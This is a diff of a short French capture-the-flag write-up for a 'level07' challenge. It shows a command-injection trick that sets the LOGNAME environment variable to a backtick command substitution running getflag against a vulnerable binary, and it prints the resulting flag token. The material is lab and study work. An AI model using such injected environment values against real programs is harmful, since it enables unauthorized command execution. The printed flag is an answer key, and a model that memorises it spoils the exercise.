@@ -20,5 +20,5 @@ x/s 0x8048680
     -> "LOGNAME" du coup facile à exploiter:
 
 - on utilise les modifications d'environnememt pour l'execution
-LOGNAME=`getflag` ./level07
+LOGNAME=\`getflag\` ./level07
     -> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
